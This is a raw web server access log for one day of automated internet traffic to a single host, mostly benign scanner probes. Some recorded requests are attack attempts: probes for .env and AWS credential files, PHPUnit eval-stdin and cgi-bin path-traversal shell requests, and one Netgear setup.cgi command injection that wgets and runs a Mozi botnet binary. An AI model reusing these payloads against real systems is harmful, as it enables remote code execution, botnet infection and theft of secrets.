164.52.24.179 - - [07/Jan/2025:07:44:00 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.24.179 - - [07/Jan/2025:07:44:04 +0000] "GET / HTTP/1.1" 200 1684 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
192.155.90.118 - - [07/Jan/2025:07:46:26 +0000] "\x16\x03\x01" 400 526 "-" "-"
104.152.52.138 - - [07/Jan/2025:07:52:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
93.174.93.12 - - [07/Jan/2025:07:56:27 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17"
193.34.212.75 - - [07/Jan/2025:08:07:47 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
80.82.77.202 - - [07/Jan/2025:08:11:01 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
8.136.96.113 - - [07/Jan/2025:08:22:40 +0000] "GET /version HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
8.136.96.113 - - [07/Jan/2025:08:22:40 +0000] "GET /containers/json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
8.136.96.113 - - [07/Jan/2025:08:22:40 +0000] "GET /.env.bak HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
8.136.96.113 - - [07/Jan/2025:08:22:41 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
8.136.96.113 - - [07/Jan/2025:08:22:41 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
8.136.96.113 - - [07/Jan/2025:08:22:41 +0000] "GET /config/aws.yml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
8.136.96.113 - - [07/Jan/2025:08:22:41 +0000] "GET /aws.yml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
8.136.96.113 - - [07/Jan/2025:08:22:41 +0000] "\x16\x03\x01" 400 526 "-" "-"
8.136.96.113 - - [07/Jan/2025:08:22:42 +0000] "\x16\x03\x01" 400 526 "-" "-"
8.136.96.113 - - [07/Jan/2025:08:22:42 +0000] "\x16\x03\x01" 400 526 "-" "-"
8.136.96.113 - - [07/Jan/2025:08:22:42 +0000] "\x16\x03\x01" 400 526 "-" "-"
8.136.96.113 - - [07/Jan/2025:08:22:42 +0000] "\x16\x03\x01" 400 526 "-" "-"
8.136.96.113 - - [07/Jan/2025:08:22:42 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.148 - - [07/Jan/2025:08:29:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:08:29:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [07/Jan/2025:08:31:47 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
101.109.237.154 - - [07/Jan/2025:08:50:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.53.198 - - [07/Jan/2025:08:56:18 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
202.166.220.109 - - [07/Jan/2025:08:57:37 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
87.120.115.34 - - [07/Jan/2025:09:02:37 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.7.18"
172.202.177.248 - - [07/Jan/2025:09:15:52 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
121.163.229.222 - - [07/Jan/2025:09:27:03 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
86.153.71.38 - - [07/Jan/2025:09:53:30 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [07/Jan/2025:10:17:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
205.210.31.161 - - [07/Jan/2025:10:19:23 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
91.223.3.201 - - [07/Jan/2025:10:31:47 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
8.211.162.45 - - [07/Jan/2025:10:42:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
118.41.24.207 - - [07/Jan/2025:10:42:14 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.82.219.124 - - [07/Jan/2025:10:49:50 +0000] "GET /.env HTTP/1.0" 302 350 "-" "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0"
117.235.54.110 - - [07/Jan/2025:10:55:37 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 302 350 "-" "-"
152.42.219.47 - - [07/Jan/2025:11:01:37 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [07/Jan/2025:11:01:47 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
220.70.187.46 - - [07/Jan/2025:11:05:59 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.3.223.55 - - [07/Jan/2025:11:14:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
91.223.3.201 - - [07/Jan/2025:11:18:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.104.11.4 - - [07/Jan/2025:11:48:41 +0000] "\x16\x03\x01" 400 526 "-" "-"
87.120.112.187 - - [07/Jan/2025:11:52:56 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 5.1.1; KYF39 Build/100.0.2039; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36"
154.213.184.132 - - [07/Jan/2025:12:08:25 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
78.153.140.148 - - [07/Jan/2025:12:43:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:12:43:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [07/Jan/2025:12:47:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.101.104 - - [07/Jan/2025:13:16:21 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.148 - - [07/Jan/2025:13:34:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:13:34:49 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
128.199.31.202 - - [07/Jan/2025:13:53:07 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible)"
128.199.31.202 - - [07/Jan/2025:13:53:08 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "http://35.220.248.27/" "Mozilla/5.0 (compatible)"
172.206.143.168 - - [07/Jan/2025:13:56:24 +0000] "GET /druid/index.html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.146 - - [07/Jan/2025:14:02:38 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [07/Jan/2025:14:06:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [07/Jan/2025:14:14:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
175.212.107.4 - - [07/Jan/2025:14:14:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [07/Jan/2025:14:20:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [07/Jan/2025:14:35:29 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:14:35:30 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
171.6.16.51 - - [07/Jan/2025:14:36:03 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
36.39.153.244 - - [07/Jan/2025:14:37:33 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
175.195.255.43 - - [07/Jan/2025:14:49:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.156.129.46 - - [07/Jan/2025:14:49:28 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
148.153.45.238 - - [07/Jan/2025:14:52:32 +0000] "GET /o7mI HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [07/Jan/2025:14:52:33 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/o7mI" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [07/Jan/2025:14:52:34 +0000] "GET /WzEG HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [07/Jan/2025:14:52:34 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/WzEG" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [07/Jan/2025:14:52:35 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [07/Jan/2025:14:52:35 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [07/Jan/2025:14:52:36 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [07/Jan/2025:14:52:37 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
49.51.233.95 - - [07/Jan/2025:14:55:05 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
195.3.223.55 - - [07/Jan/2025:15:18:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
199.45.154.126 - - [07/Jan/2025:15:34:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
199.45.154.126 - - [07/Jan/2025:15:34:38 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.126 - - [07/Jan/2025:15:34:38 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.126 - - [07/Jan/2025:15:34:38 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.154.126 - - [07/Jan/2025:15:34:38 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
103.208.230.28 - - [07/Jan/2025:15:41:45 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
139.59.101.104 - - [07/Jan/2025:15:59:06 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
154.213.184.132 - - [07/Jan/2025:16:31:44 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
193.34.212.75 - - [07/Jan/2025:16:51:30 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [07/Jan/2025:17:01:19 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:17:01:19 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
118.41.19.206 - - [07/Jan/2025:17:14:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.148 - - [07/Jan/2025:17:14:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:17:14:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
167.94.146.50 - - [07/Jan/2025:17:24:55 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.146.50 - - [07/Jan/2025:17:24:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.50 - - [07/Jan/2025:17:25:00 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.50 - - [07/Jan/2025:17:25:01 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.50 - - [07/Jan/2025:17:25:01 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
156.233.225.192 - - [07/Jan/2025:17:49:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
156.233.225.192 - - [07/Jan/2025:17:49:06 +0000] "GET /js HTTP/1.1" 301 516 "-" "Go-http-client/1.1"
156.233.225.192 - - [07/Jan/2025:17:49:07 +0000] "GET /js/ HTTP/1.1" 200 839 "http://35.220.248.27/js" "Go-http-client/1.1"
156.233.225.192 - - [07/Jan/2025:17:49:07 +0000] "GET /../js/brand.js HTTP/1.1" 400 487 "-" "Go-http-client/1.1"
156.233.225.192 - - [07/Jan/2025:17:49:08 +0000] "GET /../js/login.js HTTP/1.1" 400 487 "-" "Go-http-client/1.1"
78.153.140.148 - - [07/Jan/2025:17:50:29 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:17:50:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [07/Jan/2025:18:07:52 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
185.16.39.104 - - [07/Jan/2025:18:40:06 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
221.166.130.210 - - [07/Jan/2025:18:46:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [07/Jan/2025:18:53:35 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:18:53:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.129 - - [07/Jan/2025:19:00:34 +0000] "\x16\x03\x01" 400 526 "-" "-"
205.210.31.129 - - [07/Jan/2025:19:00:34 +0000] "\x16\x03\x01" 400 526 "-" "-"
91.223.3.201 - - [07/Jan/2025:19:01:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.94.145.107 - - [07/Jan/2025:19:18:53 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.145.107 - - [07/Jan/2025:19:18:56 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.107 - - [07/Jan/2025:19:18:57 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.107 - - [07/Jan/2025:19:18:57 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.107 - - [07/Jan/2025:19:18:58 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
157.230.225.34 - - [07/Jan/2025:19:34:29 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
92.255.57.58 - - [07/Jan/2025:19:44:15 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.105.128.11 - - [07/Jan/2025:19:50:52 +0000] "\x16\x03\x01" 400 526 "-" "-"
43.155.136.16 - - [07/Jan/2025:20:04:41 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
79.53.33.55 - - [07/Jan/2025:20:09:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.3.223.55 - - [07/Jan/2025:20:15:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [07/Jan/2025:20:21:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
91.223.3.201 - - [07/Jan/2025:20:26:44 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
179.43.191.146 - - [07/Jan/2025:20:27:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [07/Jan/2025:20:38:53 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
119.6.253.73 - - [07/Jan/2025:20:42:49 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
51.8.71.122 - - [07/Jan/2025:21:02:32 +0000] "MGLNDD_35.220.248.27_80\n" 400 526 "-" "-"
92.255.57.58 - - [07/Jan/2025:21:03:57 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [07/Jan/2025:21:03:58 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
206.168.34.204 - - [07/Jan/2025:21:10:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.204 - - [07/Jan/2025:21:10:18 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.204 - - [07/Jan/2025:21:10:19 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.204 - - [07/Jan/2025:21:10:21 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.204 - - [07/Jan/2025:21:10:22 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
78.153.140.148 - - [07/Jan/2025:21:11:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [07/Jan/2025:21:11:26 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
209.38.245.249 - - [07/Jan/2025:21:16:42 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
209.38.245.249 - - [07/Jan/2025:21:16:43 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.245.249 - - [07/Jan/2025:21:16:43 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
209.38.245.249 - - [07/Jan/2025:21:16:43 +0000] "GET /odinhttpcall1736284602 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.245.249 - - [07/Jan/2025:21:16:43 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.245.249 - - [07/Jan/2025:21:16:43 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
209.38.245.249 - - [07/Jan/2025:21:16:44 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
209.38.245.249 - - [07/Jan/2025:21:16:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
46.101.102.51 - - [07/Jan/2025:21:16:44 +0000] "\x16\x03\x01" 400 526 "-" "-"
134.122.93.151 - - [07/Jan/2025:21:16:44 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
64.226.64.197 - - [07/Jan/2025:21:16:45 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
161.35.69.47 - - [07/Jan/2025:21:16:45 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
164.92.164.34 - - [07/Jan/2025:21:16:45 +0000] "GET /solr/admin/info/system HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
46.101.102.51 - - [07/Jan/2025:21:16:45 +0000] "\x16\x03\x01" 400 526 "-" "-"
64.226.64.197 - - [07/Jan/2025:21:16:45 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/cgi-bin/authLogin.cgi" "Go-http-client/1.1"
161.35.69.47 - - [07/Jan/2025:21:16:45 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
164.92.164.34 - - [07/Jan/2025:21:16:45 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/solr/admin/info/system" "Go-http-client/1.1"
